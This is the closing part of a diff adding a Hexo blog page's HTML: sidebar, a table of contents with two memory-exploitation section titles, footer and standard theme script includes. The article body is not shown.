+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#泄露任意地址的内存"><span class="nav-number">1.</span> <span class="nav-text">泄露任意地址的内存</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#覆盖栈内存"><span class="nav-number">2.</span> <span class="nav-text">覆盖栈内存</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">尘林</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
